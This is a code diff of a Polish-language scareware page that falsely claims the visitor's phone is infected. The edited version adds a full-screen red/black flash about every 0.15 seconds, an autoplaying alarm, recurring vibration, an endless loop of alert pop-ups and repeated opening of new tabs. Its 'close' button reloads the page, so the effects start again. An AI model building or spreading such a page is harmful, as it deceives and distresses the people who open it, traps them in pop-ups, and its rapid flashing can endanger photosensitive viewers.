@@ -3,98 +3,68 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>UWAGA! Zainfekowano urządzenie</title>
+  <title>⚠️ Twoje urządzenie zostało zainfekowane!</title>
   <style>
-    html,body{
-      margin:0;
-      padding:0;
-      height:100%;
-      width:100%;
-    }
-    body{
-      display:flex;
-      flex-direction:column;
-      justify-content:center;
-      align-items:center;
-      background:red;
-      color:#fff;
-      font-family:Arial, Helvetica, sans-serif;
-      text-align:center;
-      animation:flash 0.6s infinite;
-      overflow:hidden;
-    }
-    @keyframes flash{
-      0%{background:red;}
-      50%{background:black;}
-      100%{background:red;}
-    }
-    h1{
-      font-size:calc(8vw + 8vh);
-      margin:0;
-      text-shadow:0 0 12px #000;
-    }
-    p{
-      font-size:6vw;
-      margin:0;
-    }
-    .hidden{display:none;}
+    /* Reset i layout */
+    html,body{margin:0;padding:0;height:100%;overflow:hidden;font-family:sans-serif;}
+    body{display:flex;flex-direction:column;justify-content:center;align-items:center;background:#000;color:#fff;text-align:center;}
+    h1{font-size:6vw;line-height:1.1;margin:0 1rem;text-shadow:0 0 20px red;}
+    #flash{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;animation:flash 0.15s infinite;}
+    @keyframes flash{0%{background:rgba(255,0,0,0.8);}50%{background:rgba(0,0,0,0.8);}100%{background:rgba(255,0,0,0.8);}}
+    .btn{margin-top:2rem;padding:1rem 2rem;font-size:1.2rem;border:none;border-radius:12px;background:#ff0000;color:#fff;cursor:pointer;}
   </style>
 </head>
 <body>
-  <h1>⚠️ UWAGA!</h1>
-  <p>Twoje urządzenie<br />ZOSTAŁO ZAINFEKOWANE</p>
+  <div id="flash"></div>
+  <h1>⚠️ UWAGA! TWÓJ TELEFON ZOSTAŁ ZAINFEKOWANY ⚠️</h1>
+  <button class="btn" onclick="stopEffects()">Zamknij</button>
 
-  <!-- Szybki, piskliwy dźwięk alarmu (możesz podmienić plik na własny) -->
-  <audio id="alarm" loop class="hidden">
-    <source src="alarm.mp3" type="audio/mpeg" />
-  </audio>
+  <!-- Dźwięk alarmu (podmień src na własny plik MP3) -->
+  <audio id="alarm" src="alarm.mp3" loop></audio>
 
-  <script>
-    (function () {
-      const VIBRATE_PATTERN = [600, 200, 600, 200, 600, 600, 200];
+<script>
+(function(){
+  const alarm = document.getElementById('alarm');
+  alarm.volume = 1;
+  // Spróbuj odtworzyć dźwięk natychmiast – nie wszystkie przeglądarki pozwolą
+  alarm.play().catch(()=>{});
 
-      // Uruchom straszenie po pełnym wczytaniu
-      window.addEventListener("load", () => {
-        // 1) Spróbuj odtworzyć dźwięk
-        const alarm = document.getElementById("alarm");
-        if (alarm) {
-          const p = alarm.play();
-          if (p !== undefined) {
-            p.catch(() => {
-              /* autoplay może zostać zablokowany – wtedy dźwięk uruchomi się dopiero po pierwszym tapnięciu */
-            });
-          }
-        }
+  const vibrationPattern = [400, 200, 400, 200, 800];
+  let vibrated = false;
 
-        // 2) Wibracje (działa na większości Androidów, nie na iOS)
-        if ("vibrate" in navigator) {
-          navigator.vibrate(VIBRATE_PATTERN);
-          setInterval(() => navigator.vibrate(VIBRATE_PATTERN), 4000);
-        }
+  function vibrateNow(){
+    if (navigator.vibrate) {
+      navigator.vibrate(vibrationPattern);
+      vibrated = true;
+    }
+  }
 
-        // 3) Seria alertów – nachodzące modale blokujące
-        for (let i = 0; i < 3; i++) {
-          setTimeout(() => {
-            alert("⚠️ UWAGA! Twoje urządzenie zostało ZAINFEKOWANE!");
-          }, i * 1500);
-        }
+  /* 🔥 ZMIANA: natychmiastowe wibracje tuż po załadowaniu skryptu */
+  vibrateNow();
 
-        // 4) Dodatkowe minipopu‑py (w razie pozwolenia przez przeglądarkę mobilną)
-        setInterval(() => {
-          const w = window.open(
-            "",
-            "",
-            "width=260,height=120,menubar=0,toolbar=0,status=0"
-          );
-          if (w) {
-            w.document.write(
-              '<body style="margin:0;display:flex;justify-content:center;align-items:center;background:red;color:white;font-family:Arial;font-size:18px;">⚠️ Zainfekowano!</body>'
-            );
-            setTimeout(() => w.close(), 3000);
-          }
-        }, 5000);
-      });
-    })();
-  </script>
+  // Fallback – pierwszy dotyk użytkownika (iOS wymaga gestu)
+  window.addEventListener('touchstart', ()=>{ if(!vibrated) vibrateNow(); }, {once:true});
+
+  // Utrzymuj efekt co 3 s
+  setInterval(vibrateNow, 3000);
+
+  // Pętla z komunikatami alert
+  setTimeout(function alertLoop(){
+    alert('⚠️ Twój telefon jest zainfekowany! ⚠️');
+    setTimeout(alertLoop, 5000);
+  }, 400);
+
+  // Próba otwierania nowych kart (może być blokowane)
+  setInterval(()=>{ window.open('about:blank', '_blank'); }, 7000);
+})();
+
+function stopEffects(){
+  if(navigator.vibrate) navigator.vibrate(0);
+  const alarm = document.getElementById('alarm');
+  alarm.pause();
+  alarm.currentTime = 0;
+  document.location.reload();
+}
+</script>
 </body>
 </html>
